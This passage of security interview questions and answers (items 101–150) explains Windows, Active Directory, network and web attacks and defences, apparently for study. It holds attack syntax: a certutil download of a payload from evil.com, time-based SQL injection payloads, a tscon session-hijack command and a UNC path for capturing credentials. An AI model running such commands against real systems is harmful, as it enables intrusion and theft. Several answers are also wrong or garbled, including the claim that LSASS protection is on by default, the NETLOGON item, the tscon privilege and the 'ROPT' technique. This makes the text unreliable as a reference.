
---
#### **101. Question: What is "Just-Enough-Administration" (JEA) in PowerShell and how does it improve security?**
-  JEA is a security technology that enables delegated administration for PowerShell. It allows you to define exactly what commands a user can run in a PowerShell session, and in what context (often as a highly privileged virtual account). This enforces the principle of least privilege by ensuring users can only perform specific administrative tasks without granting them full administrator rights on the system.

---
#### **102. Question: Explain the "Kerberos Bronze Bit" attack (CVE-2020-17049).**
-  This vulnerability allows an attacker to bypass the protection mechanism for Kerberos resource-based constrained delegation. Normally, you can't forward a ticket that isn't forwardable. The Bronze Bit attack allows an attacker to set the "forwardable" flag on a service ticket they control, even when it shouldn't be set, enabling them to impersonate users to specific services and potentially escalate privileges.

---
#### **103. Question: What is "Token Kidnapping" in the context of Windows security?**
-  Token Kidnapping is a technique where a lower-privileged process steals the token of a higher-privileged process (like a service running as SYSTEM) that is running on the same machine. By impersonating this token, the attacker can elevate their privileges. This often exploits weaknesses in Windows services that use named pipes or RPC endpoints accessible by low-privileged users.

---
#### **104. Question: Describe the "DNS Rebinding" attack and how it can be used to bypass network firewalls.**
-  DNS Rebinding turns a victim's browser into a proxy to attack internal networks. The attacker registers a domain and sets a very short TTL. The victim visits the malicious site, and their browser resolves the domain to the attacker's IP. Then, the DNS record is rebinded to an internal IP address (e.g., 192.168.1.1). The same-origin policy is bypassed because the origin is still the original domain, allowing the malicious JavaScript to make requests to the internal network.

---
#### **105. Question: What is the critical difference between "Hibernation" and "Sleep" modes in Windows from a forensics/attacker perspective?**
-  When a system goes into **Hibernation**, the entire contents of RAM are written to the disk in the file `hiberfil.sys`. This file can contain a treasure trove of volatile data, including encryption keys, passwords, and active sessions. **Sleep** mode keeps data in RAM and only provides a low power state; the data is lost if the system loses power. For an attacker or forensic investigator, `hiberfil.sys` is a valuable target for analysis, while a sleeping system's memory is only accessible while it's powered on.

---
#### **106. Question: How does the "PetitPotam" attack coerce authentication from a Windows machine?**
-  PetitPotam exploits the Encrypting File System Remote Protocol (MS-EFSRPC). It sends a malicious RPC request to a target machine, coercing it to authenticate to an attacker-controlled NTLM relay server. This is particularly dangerous when targeting Domain Controllers, as it can force them to reveal their computer account hash, which can then be relayed for privilege escalation.

---
#### **107. Question: What is a "Time-based SQL Injection" and what is the primary indicator of a successful exploit?**
-  It's a form of Blind SQL Injection where the attacker uses SQL commands that introduce a time delay in the database's response (e.g., `SLEEP(5)` in MySQL, `WAITFOR DELAY '00:00:05'` in MSSQL). The primary indicator is a noticeable delay in the HTTP response from the web server, confirming the vulnerability and allowing the attacker to infer data character by character (e.g., `IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)`).

---
#### **108. Question: In cloud security, what is the "Shared Responsibility Model"?**
-  It's a security framework that defines the security obligations of the cloud provider and the cloud customer. Generally, the provider is responsible for the security *of* the cloud (the underlying infrastructure), while the customer is responsible for security *in* the cloud (their data, access management, application security, and OS configuration).

---
#### **109. Question: What is "Reflective DLL Injection" and how does it differ from standard DLL injection?**
-  Standard DLL injection involves writing the path of a DLL to disk and then loading it via `LoadLibraryA`. Reflective DLL Injection avoids writing to disk. The malicious DLL is stored in memory, and a custom loader manually maps it into the target process's memory by performing the necessary steps the OS loader would do: allocating memory, resolving imports, applying relocations, and calling `DllMain`. This is far stealthier and bypasses many AV/EDR solutions that monitor for `LoadLibrary` calls.

---
#### **110. Question: Explain the "Golden SAML" attack against cloud identity providers.**
-  The Golden SAML attack does not target user passwords or MFA. Instead, it compromises the Identity Provider (IdP) itself, specifically the token signing certificates. With these certificates, an attacker can forge SAML responses for any user to any application that trusts the IdP, granting them unrestricted access to cloud applications (like Salesforce, AWS, etc.). This is a "cloud Golden Ticket."

---
#### **111. Question: What is "Seatbelt" and what is its primary use case for a red teamer?**
-  Seatbelt is a C# tool that performs local security reconnaissance on a Windows host. It's used by red teamers to quickly gather a wide array of system information post-exploitation, such as running processes, interesting files, system configuration, stored credentials, and evidence of security products, helping to orient themselves and identify privilege escalation paths.

---
#### **112. Question: How does the "ROPT (Return Oriented Programming Threading)" technique enhance shellcode execution?**
-  ROPT is an advanced evasion technique that leverages ROP chains to dynamically enable memory permissions and execute shellcode. Instead of a simple ROP chain that calls `VirtualProtect` and jumps to shellcode, ROPT uses ROP gadgets to create a new thread in a suspended state, modify its context to point to the shellcode, and then resume the thread. This is highly effective at bypassing EDR userland hooks, as the execution happens outside the scrutinized main thread.

---
#### **113. Question: What is "ARP Cache Poisoning" and what is a modern mitigation at the switch level?**
-  ARP Cache Poisoning (or ARP Spoofing) is where an attacker sends falsified ARP messages to associate their MAC address with the IP address of a legitimate machine. A modern mitigation is **Dynamic ARP Inspection (DAI)**. DAI validates ARP packets by checking them against a trusted database (the DHCP snooping binding table) and blocks any invalid ARP packets.

---
#### **114. Question: Describe the "Lateral Movement" technique "Remote Desktop Protocol (RDP) Hijacking".**
-  RDP Hijacking involves taking over an existing, logged-in RDP session. On Windows, using `tscon.exe` with the session ID of another user (e.g., `tscon 3 /dest:rdp-tcp#0`) and the correct permissions (e.g., `SeRemoteShutdownPrivilege`), an attacker can switch to that user's session without knowing their password, provided the session is active (e.g., a disconnected admin session).

---
#### **115. Question: What is a "Magic Packet" and what is its relevance to network security?**
-  A Magic Packet is a specially crafted frame used to wake up a computer via Wake-on-LAN (WoL). From a security perspective, it's a potential attack vector. If WoL is enabled on a network interface and not properly secured (e.g., with a secure-on-LAN password), an attacker on the same network segment can send a magic packet to wake up a powered-off computer, potentially bringing it back into a vulnerable state for attack.

---
#### **116. Question: What is "Credential Guard" in Windows 10/11 and how does it protect against Mimikatz?**
-  Credential Guard uses virtualization-based security (VBS) to isolate the Local Security Authority (LSA) process. It stores NTLM hashes, Kerberos tickets, and other credentials in a secure, hypervisor-protected container that is inaccessible from the normal operating system. This prevents tools like Mimikatz from directly reading these credentials from LSASS memory.

---
#### **117. Question: Explain the "Double Pulsar" backdoor and its association with the ETERNALBLUE exploit.**
-  Double Pulsar was a kernel-level backdoor implanted by the ETERNALBLUE exploit. Once a system was compromised via ETERNALBLUE, Double Pulsar would be installed to maintain persistence and provide a covert channel for uploading and executing additional payloads. It was a stealthy, memory-only backdoor that made detection very difficult.

---
#### **118. Question: What is "Software Bill of Materials" (SBOM) and why is it critical for supply chain security?**
-  An SBOM is a nested inventory, a list of ingredients that make up software components. It's critical because it provides transparency into the third-party and open-source libraries used in an application. This allows organizations to quickly identify and remediate vulnerabilities in their software supply chain, such as those found in Log4j, without manually auditing every codebase.

---
#### **119. Question: How does the "SCM (Service Control Manager) UAC Bypass" technique work?**
-  This technique exploits the fact that the Service Control Manager (SCM) allows certain privileged operations without prompting for UAC. By using Windows API calls to create a service that runs as SYSTEM (e.g., with `CreateService` and `StartService`), a user in the local Administrators group can elevate their privileges without triggering a UAC prompt, provided UAC is set to the default ("Notify me only when...") level.

---
#### **120. Question: What is "SigFlip" (Signature Block Tampering) and how is it used to evade detection?**
-  SigFlip is a technique where malicious code is embedded into the unused certificate section (cave) of a legitimately signed binary. This preserves the original, valid digital signature because the signature is calculated on the *original* file content. The malicious payload is then extracted and executed in memory, allowing the malware to ride on the trust of the signed binary while bypassing signature-based AV checks.

---
#### **121. Question: Describe the "Pass the Certificate" attack in an Active Directory Certificate Services (AD CS) environment.**
-  This attack leverages user or machine certificates for authentication instead of passwords or hashes. If an attacker can obtain a user's certificate (e.g., through theft or by having enrollment rights), they can use it to request a Kerberos Ticket-Granting Ticket (TGT) from a Domain Controller, effectively authenticating as that user without knowing their password. This is a powerful persistence mechanism.

---
#### **122. Question: What is "Inline Hook" and how do EDRs use it for detection?**
-  An Inline Hook is a technique where the first few instructions of a Windows API function (e.g., `NtCreateThreadEx`) are overwritten with a `jmp` instruction to a detour function. EDRs use this to intercept and inspect API calls made by processes. Their detour function can analyze the parameters, stack, and behavior before allowing the original function to execute, enabling behavioral detection.

---
#### **123. Question: How can "WMI Event Subscription" be used for persistence? Provide a high-level example.**
-  An attacker can create a WMI event filter that triggers on a system event (e.g., a specific time, user logon, process start) and binds it to an event consumer (e.g., `ActiveScriptEventConsumer`). When the event occurs, the consumer executes a script (VBScript, JScript) that runs the malicious payload. This persistence is fileless and resides only in the WMI repository.

---
#### **124. Question: What is "SMB Relay" and why is it less effective on modern Windows networks by default?**
-  SMB Relay is an attack where an attacker captures an SMB authentication attempt and relays it to another machine to gain access. It's less effective now because Microsoft introduced **SMB Signing** and enabled it by default on Domain Controllers and newer Windows clients. SMB Signing ensures the integrity of the SMB session, making relayed sessions fail authentication.

---
#### **125. Question: Explain the "Print Spooler" service vulnerability "PrintDemon" (CVE-2020-1048).**
-  PrintDemon was a local privilege escalation vulnerability. It exploited the fact that the Windows Print Spooler service, running as SYSTEM, would insecurely write files to any location on the filesystem. By specifying a printer port that pointed to a sensitive location (e.g., `C:\Windows\System32\`) and printing a file, a low-privileged user could write a malicious DLL that would later be executed with SYSTEM privileges.

---
#### **126. Question: What is "Kernel Patch Protection" (PatchGuard) in 64-bit Windows and what does it prevent?**
-  PatchGuard is a feature of 64-bit versions of Windows that prevents unauthorized modification (patching) of the kernel and critical kernel data structures. It actively detects and crashes the system if it finds such modifications, effectively preventing rootkits from hooking the kernel's System Service Dispatch Table (SSDT) or modifying core kernel code.

---
#### **127. Question: How does the "Forced Authentication" attack using the `NETLOGON` service work?**
-  This attack tricks a Windows machine into authenticating to an attacker-controlled server. For example, an attacker can embed a UNC path (e.g., `\\EVIL-SERVER\share`) in a document, email, or web page. When the victim's system attempts to access this path, it automatically attempts to authenticate to `EVIL-SERVER` using the current user's credentials, which the attacker can then capture with a tool like Responder.

---
#### **128. Question: What is "SeEnableDelegationPrivilege" and why is it dangerous in the wrong hands?**
-  This privilege, typically held only by Domain Admins, allows a user to enable "Trusted for Delegation" on a computer or user account. If an attacker gains this right, they can configure unconstrained delegation on a compromised machine, which then allows them to capture and reuse TGTs of any user that authenticates to it, including Domain Admins.

---
#### **129. Question: Describe the "Living off the Land Binaries" (LOLBins) concept and give two examples.**
-  LOLBins are legitimate, pre-installed system tools that can be abused for malicious purposes.
1.  **Certutil.exe:** A legitimate Windows tool for managing certificates. Attackers abuse it to download malware (`certutil -urlcache -split -f http://evil.com/payload.exe`) or encode/ decode files to evade detection.
2.  **Rundll32.exe:** Used to run DLL functions. It can be abused to execute malicious code (e.g., `rundll32.exe evil.dll,EntryPoint`).

---
#### **130. Question: What is "Vulnerability Scanning" and how does it differ from a "Penetration Test"?**
-  **Vulnerability Scanning** is an automated process that uses software to identify and report on known vulnerabilities in systems and applications. It's broad but often produces false positives. A **Penetration Test** is a manual, simulated cyberattack that involves exploitation, lateral movement, and post-exploitation to determine the real-world business impact of vulnerabilities, providing context and validation that a scanner cannot.

---
#### **131. Question: How does the "Zerologon" (CVE-2020-1472) attack exploit the Netlogon protocol?**
-  Zerologon exploits a flaw in the Netlogon authentication protocol's use of AES-CFB8. It allows an attacker to set all bytes of the initialization vector (IV) to zero, which dramatically increases the probability of a collision. By repeatedly attempting to authenticate, an attacker can establish a secure channel with a Domain Controller and ultimately reset the Domain Controller's computer account password to an empty string, compromising the entire domain.

---
#### **132. Question: What is "Application Whitelisting" and what is a common bypass technique?**
-  Application Whitelisting is a security policy that allows only pre-approved programs to run. A common bypass is to use a **LOLBin** (Living off the Land Binary) or a trusted, signed application that is already on the whitelist to execute code. For example, using `msbuild.exe` to compile and execute a malicious C# project file, or using `regsvr32.exe` to execute a malicious DLL.

---
#### **133. Question: Explain the "Pass the Key" attack in a Kerberos environment.**
-  Pass the Key is similar to Overpass the Hash. It uses a raw Kerberos key (derived from a user's password) instead of an NTLM hash to request a Ticket-Granting Ticket (TGT). This is particularly relevant when using AES keys (which are more secure than RC4 keys) and allows an attacker with the key to authenticate without the plaintext password.

---
#### **134. Question: What is "Stack Pivoting" and why is it used in advanced exploitation?**
-  Stack Pivoting is a technique used in Return-Oriented Programming (ROP) where the attacker uses a gadget to change the value of the stack pointer (ESP/RSP) to point to a memory region they control (e.g., the heap). This is done when the original stack space is limited or corrupted, allowing the attacker to build a much longer ROP chain in a new, controlled location.

---
#### **135. Question: What is "SeTrustedCredManAccessPrivilege" and how can it be abused?**
-  This privilege allows a process to access Credential Manager as a trusted caller. An attacker with this privilege can use it to dump stored credentials from the Windows Credential Manager, which may contain plaintext passwords or hashes for domain accounts, web services, or other systems.

---
#### **136. Question: Describe the "NTLMv1" vulnerability that makes it significantly weaker than NTLMv2.**
-  NTLMv1 is vulnerable because it uses a weak challenge/response mechanism based on the flawed DES algorithm. The 8-byte server challenge is short, and the response can be cracked relatively easily. Furthermore, NTLMv1 is susceptible to "sessions" where the same challenge is used, making it vulnerable to precomputed hash tables. NTLMv2 uses a longer challenge, incorporates a client challenge, and uses HMAC-MD5, making it significantly more resistant to cracking.

---
#### **137. Question: What is "API Hooking" and how is it used by both security products and malware?**
-  API Hooking is the technique of intercepting function calls. **Security products (EDRs)** use it to monitor and block malicious API calls (e.g., `VirtualAlloc`, `CreateRemoteThread`). **Malware** uses it to hide its activity by hooking APIs used by security tools (e.g., to hide files, processes, or network connections) or to capture sensitive data (e.g., keyloggers hooking `GetAsyncKeyState`).

---
#### **138. Question: How does the "RID Hijacking" technique work for persistence?**
-  Every user account in Windows has a Relative Identifier (RID). RID Hijacking involves modifying the RID value in the SAM hive for a low-privileged account (like the Guest account) to 500, which is the RID of the built-in Administrator account. After a reboot, logging into the Guest account will grant the attacker Administrator privileges. This is a stealthy persistence method as it doesn't create a new account.

---
#### **139. Question: What is "SeDebugPrivilege" and what is its significance in post-exploitation?**
-  `SeDebugPrivilege` allows a process to debug another process, which includes reading and writing its memory. In post-exploitation, this is one of the most critical privileges because it allows tools like Mimikatz to access the memory of the LSASS process to dump credentials. It is typically held by local administrators.

---
#### **140. Question: Explain the "Resource Exhaustion" attack vector in the context of DDoS.**
-  A Resource Exhaustion attack aims to consume all available resources of a system (e.g., CPU, memory, network bandwidth, disk I/O) to make it unavailable for legitimate users. In DDoS, this is often achieved by flooding a target with a massive volume of packets (volumetric) or by exploiting application-layer flaws that require more processing power (e.g., Slowloris).

---
#### **141. Question: What is "Windows Defender Application Control" (WDAC) and how does it differ from AppLocker?**
-  WDAC (formerly Code Integrity) is a Microsoft-recommended application whitelisting technology that uses policies to specify which drivers and applications are allowed to run. It's more robust than AppLocker because it starts at the kernel level, supports policies based on code signing certificates, and is difficult for administrators to bypass. AppLocker is a user-mode policy that is easier to deploy and manage but can be bypassed more easily.

---
#### **142. Question: How does the "LSASS Protection" (Lsass.exe as Protected Process) mitigate credential theft?**
-  This feature, enabled by default in Windows 10/11 and Server 2016+, runs LSASS as a Protected Process Light (PPL). This prevents non-protected processes (including most user-mode applications and tools like Mimikatz) from opening a handle to LSASS with `PROCESS_VM_READ` access, effectively blocking the ability to dump credentials from its memory.

---
#### **143. Question: What is "SeLoadDriverPrivilege" and how can it be leveraged for privilege escalation?**
-  This privilege allows a user to load a device driver. If an attacker gains this privilege, they can load a malicious or vulnerable driver. Since drivers run in kernel mode, a malicious driver can disable security software, patch the kernel, or directly read/write kernel memory, leading to a full system compromise.

---
#### **144. Question: Describe the "DHCP Starvation" attack.**
-  A DHCP Starvation attack floods a DHCP server with a massive number of DHCP DISCOVER messages, each with a spoofed MAC address. This exhausts the pool of available IP addresses, preventing legitimate clients from obtaining an IP address and causing a denial of service.

---
#### **145. Question: What is "SeTakeOwnershipPrivilege" and what can an attacker do with it?**
-  This privilege allows a user to take ownership of any securable object (files, registry keys, processes) on the system, regardless of the current permissions. With this, an attacker can take ownership of critical system files (like the SAM hive) or executables, grant themselves full permissions, and then modify or replace them to escalate privileges.

---
#### **146. Question: How does the "Token Manipulation" technique "Parent PID Spoofing" work?**
-  Parent PID Spoofing is a technique where a malicious process spawns a new process and assigns it a PPID (Parent Process ID) of a trusted, high-integrity process (like `explorer.exe` or `winlogon.exe`). This makes the new process appear to be a child of a legitimate process, which can help it evade detection by security tools that monitor for suspicious parent-child process relationships.

---
#### **147. Question: What is "SeBackupPrivilege" and how can it be used to dump the SAM hive?**
-  As mentioned in Q85, `SeBackupPrivilege` allows reading any file. To dump the SAM hive, an attacker can use tools like `reg.exe` or `diskshadow` to create a shadow copy of the `C:` drive, and then copy the `SAM`, `SYSTEM`, and `SECURITY` hives from the shadow copy to a location where they can be extracted and used to dump password hashes.

---
#### **148. Question: Explain the "Windows Filtering Platform" (WFP) and how malware can use it for evasion.**
-  WFP is a set of APIs and system services that provide the foundation for Windows Firewall and third-party firewall products. Sophisticated malware can use the WFP APIs to dynamically add firewall rules that block traffic to specific IPs (like security vendor sites) or ports, or to hide open ports from network scanning tools, effectively making the malware "invisible" on the network.

---
#### **149. Question: What is "SeImpersonatePrivilege" and why is it a common target for privilege escalation?**
-  This privilege allows a process to impersonate any user (including SYSTEM) after obtaining a token for that user. It's a common privilege escalation target because many Windows services run with this privilege. If an attacker can compromise such a service and force a SYSTEM-level process to authenticate to it (e.g., via a named pipe), they can steal the SYSTEM token and use it to escalate their privileges. This is the core of exploits like PrintSpoofer and JuicyPotato.

---
#### **150. Question: How does the "RDP Session Shadowing" feature pose a security risk?**
-  RDP Shadowing allows an administrator to remotely view or control another user's active RDP session without their explicit permission (only notification). If an attacker gains administrative access, they can use this feature to spy on users, capture sensitive information typed or displayed in their session, or even interact with the session as the user.
